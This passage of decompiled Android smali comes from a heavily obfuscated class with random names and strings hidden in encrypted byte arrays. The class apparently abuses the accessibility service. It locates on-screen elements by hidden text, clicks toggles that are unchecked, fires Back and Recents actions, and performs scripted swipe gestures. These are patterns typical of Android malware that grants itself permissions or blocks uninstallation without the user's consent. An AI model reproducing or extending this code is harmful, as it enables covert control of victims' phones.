        -0x46t
        -0x64t
        0x2et
        -0x44t
        -0x3dt
        0x21t
        0x48t
        -0x48t
        -0x57t
        -0x6et
        0x3ft
        -0x55t
    .end array-data

    :array_5
    .array-data 1
        -0x55t
        0x7et
        0x3ft
        -0x2ft
        -0x33t
        -0xbt
        0x5at
        -0x21t
    .end array-data

    :array_6
    .array-data 1
        0x3ft
        0x6dt
        0x76t
        -0x3et
        -0x38t
        -0x6ft
        -0x31t
        0x1bt
    .end array-data

    :array_7
    .array-data 1
        0x38t
        0x3dt
        0x7at
        -0x3et
        -0x51t
        -0x25t
        0x78t
        0x78t
        0x34t
        0x3bt
        0x73t
        -0x3et
        -0x43t
        -0x30t
        0x68t
        0x7et
        0x32t
        0x3ct
        0x70t
        -0x61t
        -0xct
        -0x24t
        0x78t
        0x25t
        0x36t
        0x33t
        0x7et
        -0x7et
        -0x6ft
        -0x3at
        0x6bt
        0x63t
        0x2ft
        0x31t
        0x7ft
        -0x4dt
        -0x54t
        -0x2ct
        0x6et
    .end array-data

    :array_8
    .array-data 1
        0x5bt
        0x52t
        0x17t
        -0x14t
        -0x32t
        -0x4bt
        0x1ct
        0xat
    .end array-data

    :array_9
    .array-data 1
        -0x16t
        -0x62t
        -0x51t
        -0x3ct
        -0xbt
        -0x48t
        0x4bt
        0x5t
        -0x59t
        -0x7et
        -0x45t
        -0x67t
        -0x9t
        -0x4ct
        0x50t
        0x1ft
        -0x20t
        -0x7ft
        -0x52t
        -0x61t
        -0x1ct
        -0x48t
        0x53t
        0x50t
        -0x20t
        -0x6bt
        -0x13t
        -0x68t
        -0x1at
        -0x4et
        0x44t
        0x9t
        -0x1bt
        -0x6ct
        -0x50t
        -0x4bt
        -0xbt
        -0x48t
        0x58t
        0x1dt
    .end array-data

    :array_a
    .array-data 1
        -0x77t
        -0xft
        -0x3et
        -0x16t
        -0x7dt
        -0x2ft
        0x3dt
        0x6at
    .end array-data

    :array_b
    .array-data 1
        -0x4bt
        -0x79t
        0x31t
        0x4t
        0x2ft
        -0x6bt
        -0x44t
        -0x2t
        -0x8t
        -0x65t
        0x25t
        0x59t
        0x2dt
        -0x67t
        -0x59t
        -0x1ct
        -0x41t
        -0x68t
        0x30t
        0x5ft
        0x3et
        -0x6bt
        -0x5ct
        -0x55t
        -0x41t
        -0x74t
        0x73t
        0x59t
        0x2et
        -0x6bt
        -0x42t
        -0xet
        -0x42t
        -0x49t
        0x3et
        0x5et
        0x37t
    .end array-data

    nop

    :array_c
    .array-data 1
        -0x2at
        -0x18t
        0x5ct
        0x2at
        0x59t
        -0x4t
        -0x36t
        -0x6ft
    .end array-data

    :array_d
    .array-data 1
        -0x71t
        -0x74t
        -0x7bt
        -0x10t
        -0x51t
        0x2et
        -0x28t
        0x52t
        -0x79t
        -0x7at
        -0x32t
        -0x12t
        -0x57t
        0x34t
        -0x38t
    .end array-data

    :array_e
    .array-data 1
        -0x12t
        -0x1et
        -0x1ft
        -0x7et
        -0x40t
        0x47t
        -0x44t
        0x68t
    .end array-data

    :array_f
    .array-data 1
        0x24t
        -0x1ct
        0x15t
        -0x4ft
        0x6dt
        -0xbt
        -0x1ft
        -0x9t
        0x69t
        -0x8t
        0x1t
        -0x14t
        0x6ft
        -0x7t
        -0x6t
        -0x13t
        0x2et
        -0x5t
        0x14t
        -0x16t
        0x7ct
        -0xbt
        -0x7t
        -0x5et
        0x2et
        -0x11t
        0x57t
        -0x4t
        0x74t
        -0xet
        -0x1dt
        -0x3t
        0x29t
        -0x1t
    .end array-data

    nop

    :array_10
    .array-data 1
        0x47t
        -0x75t
        0x78t
        -0x61t
        0x1bt
        -0x64t
        -0x69t
        -0x68t
    .end array-data

    :array_11
    .array-data 1
        0x1at
        -0x4ft
        0x35t
        -0x66t
        -0x20t
        0x75t
        -0x1ct
        -0xat
        0x12t
        -0x45t
        0x7et
        -0x75t
        -0x19t
        0x79t
        -0x1dt
        -0x59t
        0x19t
        -0x50t
        0x29t
    .end array-data

    :array_12
    .array-data 1
        0x7bt
        -0x21t
        0x51t
        -0x18t
        -0x71t
        0x1ct
        -0x80t
        -0x34t
    .end array-data

    :array_13
    .array-data 1
        0x5ct
        0x56t
        -0x22t
        0x4ct
        0x19t
        0x7dt
        -0x3et
        -0x5ft
        0x50t
        0x50t
        -0x29t
        0x4ct
        0xbt
        0x76t
        -0x2et
        -0x59t
        0x56t
        0x57t
        -0x2ct
        0x11t
        0x42t
        0x7at
        -0x3et
        -0x4t
        0x52t
        0x58t
        -0x26t
        0xct
        0x27t
        0x60t
        -0x2ft
        -0x46t
        0x4bt
        0x5at
        -0x25t
        0x3dt
        0x1at
        0x72t
        -0x2ct
    .end array-data

    :array_14
    .array-data 1
        0x3ft
        0x39t
        -0x4dt
        0x62t
        0x78t
        0x13t
        -0x5at
        -0x2dt
    .end array-data
.end method

.method public static synthetic U()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->P2()V

    return-void
.end method

.method private static U0(Landroid/view/accessibility/AccessibilityNodeInfo;)Z
    .locals 1

    .line 1
    if-eqz p0, :cond_0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v0

    if-eqz v0, :cond_0

    const/16 v0, 0x10

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    move-result p0

    goto :goto_0

    :cond_0
    const/4 p0, 0x0

    :goto_0
    return p0
.end method

.method private static synthetic U1(Landroid/os/Handler;)V
    .locals 3

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->l1()V

    new-instance v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/sz;

    invoke-direct {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/sz;-><init>()V

    const-wide/16 v1, 0xdac

    invoke-virtual {p0, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method private static U2()V
    .locals 5

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->S2()Landroid/content/Context;

    move-result-object v0

    new-instance v1, Landroid/os/Handler;

    invoke-direct {v1}, Landroid/os/Handler;-><init>()V

    new-instance v2, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$i;

    invoke-direct {v2, v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$i;-><init>(Landroid/content/Context;)V

    const-wide/16 v3, 0xc8

    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method public static synthetic V()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->X1()V

    return-void
.end method

.method private static V0()V
    .locals 12

    .line 1
    const/16 v0, 0x27

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    const/high16 v2, 0x40800000    # 4.0f

    const v3, 0x3f4ccccd    # 0.8f

    const/16 v4, 0x1a

    const/16 v5, 0x1e

    const/16 v6, 0xc8

    const/16 v7, 0x12

    const/16 v8, 0x1f4

    const/4 v9, 0x0

    if-eqz v0, :cond_0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v10

    if-lez v10, :cond_0

    invoke-interface {v0, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    const/16 v9, 0x24

    new-array v9, v9, [B

    fill-array-data v9, :array_2

    new-array v10, v1, [B

    fill-array-data v10, :array_3

    invoke-static {v9, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-static {v0, v9}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f1(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v8}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v7, v7, [B

    fill-array-data v7, :array_4

    new-array v1, v1, [B

    fill-array-data v1, :array_5

    invoke-static {v7, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v6}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    if-gt v0, v5, :cond_1

    if-lt v0, v4, :cond_2

    new-instance v6, Landroid/graphics/Path;

    invoke-direct {v6}, Landroid/graphics/Path;-><init>()V

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/j70;->c(Landroid/content/Context;)I

    move-result v0

    div-int/lit8 v0, v0, 0x2

    int-to-float v0, v0

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/j70;->b(Landroid/content/Context;)I

    move-result v1

    int-to-float v1, v1

    mul-float/2addr v3, v1

    invoke-virtual {v6, v0, v3}, Landroid/graphics/Path;->moveTo(FF)V

    div-float/2addr v1, v2

    invoke-virtual {v6, v0, v1}, Landroid/graphics/Path;->lineTo(FF)V

    new-instance v0, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {v0}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    const-wide/16 v7, 0x1

    const-wide/16 v9, 0x320

    const/4 v11, 0x0

    invoke-static/range {v6 .. v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cm;->a(Landroid/graphics/Path;JJZ)Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-virtual {v0}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object v0

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-instance v2, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$g;

    invoke-direct {v2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$g;-><init>()V

    :goto_0
    invoke-static {v1, v0, v2}, Lcom/vknnolqo/p9sv5zvf/TEh82iEU;->f(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Landroid/accessibilityservice/GestureDescription;Lcom/vknnolqo/p9sv5zvf/TEh82iEU$c;)V

    goto/16 :goto_1

    :cond_0
    const/16 v0, 0x13

    new-array v0, v0, [B

    fill-array-data v0, :array_6

    new-array v10, v1, [B

    fill-array-data v10, :array_7

    invoke-static {v0, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v10

    if-nez v10, :cond_1

    invoke-interface {v0, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    const/16 v9, 0x17

    new-array v9, v9, [B

    fill-array-data v9, :array_8

    new-array v10, v1, [B

    fill-array-data v10, :array_9

    invoke-static {v9, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/String;->contentEquals(Ljava/lang/CharSequence;)Z

    move-result v9

    if-eqz v9, :cond_1

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isCheckable()Z

    move-result v9

    if-eqz v9, :cond_1

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v9

    if-nez v9, :cond_1

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v9

    if-eqz v9, :cond_1

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v8}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v7, v7, [B

    fill-array-data v7, :array_a

    new-array v1, v1, [B

    fill-array-data v1, :array_b

    invoke-static {v7, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v6}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    if-gt v0, v5, :cond_1

    if-lt v0, v4, :cond_2

    new-instance v6, Landroid/graphics/Path;

    invoke-direct {v6}, Landroid/graphics/Path;-><init>()V

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/j70;->c(Landroid/content/Context;)I

    move-result v0

    div-int/lit8 v0, v0, 0x2

    int-to-float v0, v0

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/j70;->b(Landroid/content/Context;)I

    move-result v1

    int-to-float v1, v1

    mul-float/2addr v3, v1

    invoke-virtual {v6, v0, v3}, Landroid/graphics/Path;->moveTo(FF)V

    div-float/2addr v1, v2

    invoke-virtual {v6, v0, v1}, Landroid/graphics/Path;->lineTo(FF)V

    new-instance v0, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {v0}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    const-wide/16 v7, 0x1

    const-wide/16 v9, 0x320

    const/4 v11, 0x0

    invoke-static/range {v6 .. v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cm;->a(Landroid/graphics/Path;JJZ)Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-virtual {v0}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object v0

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-instance v2, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$h;

    invoke-direct {v2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$h;-><init>()V

    goto/16 :goto_0

    :cond_1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->n1()V

    :cond_2
    :goto_1
    return-void

    nop

    :array_0
    .array-data 1
        0x6t
        0xbt
        -0x21t
        0x64t
        -0x11t
        -0x35t
        -0x6bt
        -0x38t
        0x4bt
        0x17t
        -0x29t
        0x29t
        -0x9t
        -0x30t
        -0x77t
        -0x2bt
        0x1ct
        0x7t
        -0x29t
        0x24t
        -0xat
        -0x39t
        -0x6et
        -0x65t
        0xct
        0x0t
        -0x63t
        0x2bt
        -0x11t
        -0x3t
        -0x7ct
        -0x3ct
        0x11t
        0x5t
        -0x25t
        0x26t
        -0x23t
        -0x3dt
        -0x6dt
    .end array-data

    :array_1
    .array-data 1
        0x65t
        0x64t
        -0x4et
        0x4at
        -0x7et
        -0x5et
        -0x20t
        -0x5ft
    .end array-data

    :array_2
    .array-data 1
        0x3ft
        0x14t
        -0x2bt
        -0x27t
        0x7bt
        -0x21t
        -0x4at
        -0x73t
        0x72t
        0x8t
        -0x23t
        -0x6ct
        0x63t
        -0x3ct
        -0x56t
        -0x70t
        0x25t
        0x18t
        -0x23t
        -0x67t
        0x62t
        -0x2dt
        -0x4ft
        -0x22t
        0x35t
        0x1ft
        -0x69t
        -0x6at
        0x7bt
        -0x17t
        -0x50t
        -0x6dt
        0x35t
        0xft
        -0x25t
        -0x61t
    .end array-data

    :array_3
    .array-data 1
        0x5ct
        0x7bt
        -0x48t
        -0x9t
        0x16t
        -0x4at
        -0x3dt
        -0x1ct
    .end array-data

    :array_4
    .array-data 1
        0x26t
        0x2t
        0x5dt
        0x43t
        -0x14t
        -0x7dt
        -0x25t
        -0x3at
        0x2et
        0x8t
        0x16t
        0x53t
        -0xat
        -0x62t
        -0x35t
        -0x6dt
        0x29t
        0x5dt
    .end array-data

    nop

    :array_5
    .array-data 1
        0x47t
        0x6ct
        0x39t
        0x31t
        -0x7dt
        -0x16t
        -0x41t
        -0x4t
    .end array-data

    :array_6
    .array-data 1
        0x4bt
        -0x6ft
        -0xet
        -0x62t
        0x53t
        -0x36t
        0x15t
        -0x43t
        0x43t
        -0x65t
        -0x47t
        -0x71t
        0x54t
        -0x3at
        0x12t
        -0x14t
        0x48t
        -0x70t
        -0x12t
    .end array-data

    :array_7
    .array-data 1
        0x2at
        -0x1t
        -0x6at
        -0x14t
        0x3ct
        -0x5dt
        0x71t
        -0x79t
    .end array-data

    :array_8
    .array-data 1
        0xct
        0x31t
        0x5et
        0x78t
        -0x5ct
        -0x29t
        -0x28t
        -0x59t
        0x41t
        0x2dt
        0x56t
        0x35t
        -0x44t
        -0x34t
        -0x3ct
        -0x46t
        0x16t
        0x3dt
        0x56t
        0x38t
        -0x43t
        -0x25t
        -0x21t
    .end array-data

    :array_9
    .array-data 1
        0x6ft
        0x5et
        0x33t
        0x56t
        -0x37t
        -0x42t
        -0x53t
        -0x32t
    .end array-data

    :array_a
    .array-data 1
        0x1et
        0x3t
        0x31t
        -0x6ft
        0x34t
        0x46t
        0x54t
        0x54t
        0x16t
        0x9t
        0x7at
        -0x7ft
        0x2et
        0x5bt
        0x44t
        0x1t
        0x11t
        0x5ct
    .end array-data

    nop

    :array_b
    .array-data 1
        0x7ft
        0x6dt
        0x55t
        -0x1dt
        0x5bt
        0x2ft
        0x30t
        0x6et
    .end array-data
.end method

.method private static synthetic V1(Landroid/os/Handler;)V
    .locals 3

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/4 v1, 0x3

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    new-instance v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/lz;

    invoke-direct {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/lz;-><init>(Landroid/os/Handler;)V

    const-wide/16 v1, 0x3e8

    invoke-virtual {p0, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method private static V2()V
    .locals 15

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_2

    const/4 v1, 0x6

    new-array v2, v1, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    new-array v2, v1, [B

    fill-array-data v2, :array_2

    new-array v4, v3, [B

    fill-array-data v4, :array_3

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    new-array v2, v1, [B

    fill-array-data v2, :array_4

    new-array v4, v3, [B

    fill-array-data v4, :array_5

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    new-array v2, v1, [B

    fill-array-data v2, :array_6

    new-array v4, v3, [B

    fill-array-data v4, :array_7

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    const/4 v2, 0x4

    new-array v2, v2, [B

    fill-array-data v2, :array_8

    new-array v4, v3, [B

    fill-array-data v4, :array_9

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v9

    const/16 v2, 0xb

    new-array v2, v2, [B

    fill-array-data v2, :array_a

    new-array v4, v3, [B

    fill-array-data v4, :array_b

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v10

    const/16 v2, 0x12

    new-array v4, v2, [B

    fill-array-data v4, :array_c

    new-array v11, v3, [B

    fill-array-data v11, :array_d

    invoke-static {v4, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v11

    new-array v1, v1, [B

    fill-array-data v1, :array_e

    new-array v4, v3, [B

    fill-array-data v4, :array_f

    invoke-static {v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v12

    new-array v1, v2, [B

    fill-array-data v1, :array_10

    new-array v2, v3, [B

    fill-array-data v2, :array_11

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v13

    const/16 v1, 0xa

    new-array v2, v1, [B

    fill-array-data v2, :array_12

    new-array v3, v3, [B

    fill-array-data v3, :array_13

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v14

    filled-new-array/range {v5 .. v14}, [Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    :goto_0
    if-ge v3, v1, :cond_2

    aget-object v4, v2, v3

    invoke-virtual {v0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v5

    if-eqz v5, :cond_1

    invoke-interface {v5}, Ljava/util/List;->isEmpty()Z

    move-result v6

    if-nez v6, :cond_1

    invoke-interface {v5}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v5

    :cond_0
    :goto_1
    invoke-interface {v5}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_1

    invoke-interface {v5}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v7

    if-eqz v7, :cond_0

    invoke-virtual {v4, v7}, Ljava/lang/String;->contentEquals(Ljava/lang/CharSequence;)Z

    move-result v7

    if-eqz v7, :cond_0

    invoke-static {v6}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g1(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-eqz v6, :cond_0

    new-instance v7, Landroid/graphics/Rect;

    invoke-direct {v7}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v6, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v7}, Landroid/graphics/Rect;->centerX()I
